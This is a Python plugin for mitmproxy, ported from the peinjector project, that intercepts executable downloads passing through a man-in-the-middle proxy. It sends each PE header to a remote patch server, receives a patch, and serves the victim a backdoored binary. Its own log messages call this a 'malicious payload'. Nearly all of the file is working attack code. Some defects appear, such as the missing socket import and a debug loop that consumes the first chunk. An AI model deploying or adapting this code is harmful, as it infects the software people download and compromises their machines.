"""
This module is a ported version of pe-injector-interceptor which uses an outdated version of mitmproxy
https://github.com/JonDoNym/peinjector/blob/master/pe-injector-interceptor/peinjector_interceptor.py
"""

from os import path
from mitmproxy import ctx
from mitmproxy.models import decoded
from mitmplugin import MITMPlugin
import netlib.http
from AuxiliaryModules.libPePatch import PePatch

exe_mimetypes = [	
					'application/octet-stream', 'application/x-msdownload', 
					'application/exe', 'application/x-exe', 'application/dos-exe', 'vms/exe',
					'application/x-winexe', 'application/msdos-windows', 'application/x-msdos-program'
				]

class PeInjector(MITMPlugin):


	def __init__(self):
		super(PeInjector, self).__init__("peinjector")
		self.pe_server_port = int(self.config["pe_server_port"])
		# Minimum PE Size
		self.pe_minimum_size = int(self.config["pe_minimum_size"])
		# Patch config
		byte_token = '\xaa\xaa' + 30 * '\x00'
		self.pe_modifier_config = 	(
										int(self.config["max_header"]),
										int(self.config["max_patch"]),
										int(self.config["connection_timeout"]),
										byte_token
									)

	# Handles Streaming
	def responseheaders(self, flow):
		try:
			if flow.response.headers["Content-Type"] in exe_mimetypes:
				flow.response.stream = build_pe_modifier(flow, (self.config["pe_server_address"], self.config["pe_server_port"]), self.pe_modifier_config)
				ctx.log.info("[{}] Patched '{}' with malicious payload".format(self.name, flow.request.url))
				# Bypass Stream
			else:
				flow.response.stream = bypass_stream
		except Exception as e:
			ctx.log.info(str(e))
			ctx.log.info("[{}] Error: Unable to patch '{}' with malicious payload".format(self.name, flow.request.url))


# Build Payload Modifier
def build_pe_modifier(flow, patch_address, config):
	def modify(chunks):
		
		# Maximum PE Header size to expect
		# Maximum Patch size to expect
		# Connection Timeout
		# Access Token
		max_header, max_patch, connection_timeout, access_token = config
		
		header = True
		patcher = None
		position = 0
		for i in chunks:
			print(i)
			break
		for prefix, content, suffix in chunks:
			# Only do this for 1. chunk, and quick PE check
			if header and (content[:2] == 'MZ'): 
				print("Intercept PE, send header to server (" + str(len(content)) + " bytes)")
				# If something goes wrong while network transmission
				try:
					# Open socket
					patch_socket = socket.create_connection(patch_address, connection_timeout)
					# Send patch to server
					if (patch_socket is not None) and patch_socket.send(access_token + content[:max_header]):
						# Receive patch from Server
						patch_mem = patch_socket.recv(max_patch)
						# Close socket
						patch_socket.close()
						print("Received patch: " + str(len(patch_mem)) + " bytes")
						patcher = PePatch(patch_mem)
						if patcher.patch_ok():
							print("Patch Ok")
						else:
							print("Error parsing patch")
							patcher = None
				except Exception as e:
					patcher = None

			# Check only 1. chunk for header
			header = False
			
			# Apply Patch
			if patcher is not None:
				content = patcher.apply_patch(content, position)
				position += len(content)

			yield prefix, content, suffix

	return modify

def bypass_stream(chunks):
	for prefix, content, suffix in chunks:
		yield prefix, content, suffix

def start():
	return PeInjector()